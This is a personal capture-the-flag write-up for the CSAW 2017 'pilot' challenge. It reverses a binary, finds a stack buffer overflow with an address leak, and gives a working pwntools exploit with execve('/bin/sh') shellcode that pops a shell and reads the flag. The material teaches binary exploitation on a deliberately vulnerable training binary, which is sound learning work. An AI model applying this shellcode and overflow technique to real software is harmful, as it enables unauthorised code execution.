# Pilot - nigtmare

```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2017_pilot$ file pilot 
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2017_pilot$ checksec --file=pilot
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		pilot
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2017_pilot$ ./pilot 
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffe7b9350d0
[*]Command:3
[*]There are no commands....
[*]Mission Failed....
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2017_pilot$ ./pilot 
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffcd151a1a0
[*]Command:7
[*]There are no commands....
[*]Mission Failed....
```

file type - x64
we can see that every time we get another location, let reverse it
```c

undefined8 FUN_004009a6(void)

{
  basic_ostream *pbVar1;
  basic_ostream<char,std::char_traits<char>> *this;
  ssize_t sVar2;
  undefined8 uVar3;
  undefined local_28 [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Welcome DropShip Pilot...");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]I am your assitant A.I....");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                           "[*]I will be guiding you through the tutorial....");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                                                      
                           "[*]As a first step, lets learn how to land at the designatedlocation...."
                          );
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,
                                                      
                           "[*]Your mission is to lead the dropship to the right location andexecute sequence of instructions to save Marines & Medics..."
                          );
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Good Luck Pilot!....");
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
             std::endl<char,std::char_traits<char>>);
  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
  this = (basic_ostream<char,std::char_traits<char>> *)
         std::basic_ostream<char,std::char_traits<char>>::operator<<
                   ((basic_ostream<char,std::char_traits<char>> *)pbVar1,local_28);
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            (this,std::endl<char,std::char_traits<char>>);
  std::operator<<((basic_ostream *)std::cout,"[*]Command:");
  sVar2 = read(0,local_28,0x40);
  if (sVar2 < 5) {
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]There are no commands....");
    std::basic_ostream<char,std::char_traits<char>>::operator<<
              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
               std::endl<char,std::char_traits<char>>);
    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Mission Failed....");
    std::basic_ostream<char,std::char_traits<char>>::operator<<
              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
               std::endl<char,std::char_traits<char>>);
    uVar3 = 0xffffffff;
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}
```

every time we print the pointer of local_28 -> so we have here `ASLR` and local_28 is our leak info 
```
pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
  this = (basic_ostream<char,std::char_traits<char>> *)
         std::basic_ostream<char,std::char_traits<char>>::operator<<
                   ((basic_ostream<char,std::char_traits<char>> *)pbVar1,local_28);
```
moreover we see the vulnerbility `sVar2 = read(0,local_28,0x40);` ,we can override the return address and put shellcode to execute some code

lets first calculte how many bytes exist between local_28 to return_addres
```
pwndbg> p $rbp - 0x20
$1 = (void *) 0x7fffffffdeb0
pwndbg> retaddr 
0x7fffffffded8 —▸ 0x7ffff7c47d0a (__libc_start_main+234) ◂— mov    edi, eax
0x7fffffffdfa8 —▸ 0x4008d9 ◂— 0xb80000441f0f66f4

Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffded8-0x7fffffffdeb0
40
```

now that we know that we have only 40 bytes lets add shell code at the begining of the buffer and replace the rip woth the address of local_28
```python
from pwn import process, packing

def exploit():
    shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    prs = process("/home/matan/Documents/hacking/nightmare/stackoverflow/Csaw_2017_pilot/pilot")
    s_addr = prs.recvline_contains("[*]Location").decode().split(':')[1]
    ret_addr = int(s_addr,16)
    buffer = shellcode + b'A' * (40 - len(shellcode)) + packing.p64(ret_addr)
    prs.send(buffer)
    prs.interactive()


if __name__ == '__main__':
    exploit()
```

Result:
```
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Csaw_2017_pilot$ /home/matan/Documents/hde65/web_requests/bin/python /home/matan/Documents/hde65/web_requests/nightmare/pilot.py
[+] Starting local process '/home/matan/Documents/hacking/nightmare/stackoverflow/Csaw_2017_pilot/pilot': pid 68796
[*] Switching to interactive mode
[*]Command:$ cat flag
flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
```





